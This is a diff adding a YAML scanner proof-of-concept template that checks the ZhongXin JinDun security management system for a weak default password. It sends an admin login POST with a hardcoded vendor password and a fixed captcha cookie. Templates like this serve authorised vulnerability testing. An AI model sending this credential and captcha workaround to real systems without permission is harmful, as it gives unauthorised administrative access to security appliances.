@@ -1,0 +1,22 @@
+id: poc-yaml-zhongxin-jindun-weak-pass
+info:
+  name: 中信金盾安全管理系统弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: 中信金盾
+  osprey-id: vb_2021_0026
+requests:
+- method: POST
+  path: /?q=common/login
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101
+      Firefox/86.0
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Cookie: check_code=wnd3
+  data: name=admin&password=zxsoft1234!@#$&checkcode=wnd3&doLoginSubmit=1
+  expression: 'status_code == 200 && body == "1" && contains(headers, "ZXSOFT_JDIS_USR_NAME=delete")
+
+    '
+variables: {}
+transport: http
